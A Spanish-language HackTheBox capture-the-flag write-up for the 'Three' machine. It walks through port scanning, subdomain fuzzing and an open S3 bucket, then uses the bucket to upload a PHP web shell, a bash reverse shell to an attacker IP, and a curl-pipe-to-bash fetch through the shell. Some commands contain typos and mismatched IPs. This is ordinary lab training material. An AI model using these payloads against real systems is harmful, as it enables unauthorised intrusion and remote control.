# Three

Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 5 de diciembre de 2024 17:37 IP: 10.129.203.61

## Recopilación de información

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

***

💡 NMAP

```bash
❯ sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.129.242.54 -oG targeted
```

![image.png](<../../.gitbook/assets/image (1).png>)

```bash
sudo namp -p22,80 -SCV 10.129.242.54 -oN tallports
```

![image.png](<../../.gitbook/assets/image 1 (1).png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

***

* **Identificación de vulnerabilidades**
  * 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
  * 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
* **Web Discovery**

![image.png](<../../.gitbook/assets/image 2 (1).png>)

```bash
echo "10.129.203.61 thetoppers.htb" | sudo tee -a /etc/hosts
```

Fuzzing subdomains:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain | grep -v "Status: 400"

# --append-domain
#grep -v "status 400" : Oculta codigo error 400
```

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.thetoppers.htb" -u 10.129.203.61 --hl=234   
```

![image.png](<../../.gitbook/assets/image 3 (1).png>)

Añadimos el subdominio al etc/host

```bash
echo "10.129.203.61 thetoppers.htb,s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Visitamos el subdominio: s3.thetoppers.htb

![image.png](<../../.gitbook/assets/image 4 (1).png>)

Hacemos fuzzing:

```bash
gobuster dir -u http://s3.thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![image.png](<../../.gitbook/assets/image 5 (1).png>)

## Explotación

### Explotación 1

Seguimos configuracion de AWS:

```bash
aws configure
```

![image.png](<../../.gitbook/assets/image 6 (1).png>)

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls 
```

![image.png](<../../.gitbook/assets/image 7 (1).png>)

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

![image.png](<../../.gitbook/assets/image 8 (1).png>)

Probamos a subir un fichero a la raiz del servidor :

```bash
<?php system($_GET["cmd"]); ?>
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Lo subimos mediante:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Accedemos a :

```html
http://thetoppers.htb/shell.php?cmd=id
```

![image.png](<../../.gitbook/assets/image 9 (1).png>)

Creamos un fichero que al llamarlo por curl, nos de acceso a una rever shell: rever.sh

```html
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.76/4444 0>&1
```

Nos ponemos en escucha

```html
nc -lvnp 4444
```

Montamos un servidor web para poder llamar al fichermo mediante curl:

```html
python3 -m http.server 8080
```

Hacemos curl al fichero:

```html
http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.76:8080/rever.sh|bash

```

Obtenemos acceso a la maquina:

![image.png](<../../.gitbook/assets/image 10 (1).png>)

## Explotación posterior

💡 Buscamos la Flag

```bash
find / -name  "flag.txt"
```

![image.png](<../../.gitbook/assets/image 11 (1).png>)

## Conclusión

💡 No he podido resolver la maquina sin writteup por el tema de AWS.💡 No hay escalada de privilegios.
